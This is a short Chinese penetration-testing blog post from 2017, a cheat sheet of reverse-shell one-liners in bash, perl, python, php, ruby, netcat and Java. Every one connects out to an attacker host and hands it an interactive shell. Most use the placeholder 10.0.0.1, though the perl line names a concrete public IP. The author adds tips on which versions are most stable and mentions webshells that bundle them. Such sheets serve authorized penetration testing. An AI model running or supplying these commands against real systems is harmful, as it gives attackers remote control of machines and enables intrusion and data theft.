---
title: 各种反弹shell姿势
date: 2017-09-11 17:51:45
tags: 渗透
---

除以下介绍的一句话反弹shell姿势外，还有一种back.py反弹，推荐
bash版本，注意修改端口

    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

perl版本

    perl -e 'use Socket;$i="103.59.216.27";$p=18888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

python版本，推荐，较稳定

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

php版本，某些PHP大马中有集成此功能

    php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

ruby版本

    ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

nc版本

    nc -e /bin/sh 10.0.0.1 1234
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
    nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999

java版本，JSPSPY中有集成，比较稳定，推荐

    r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()

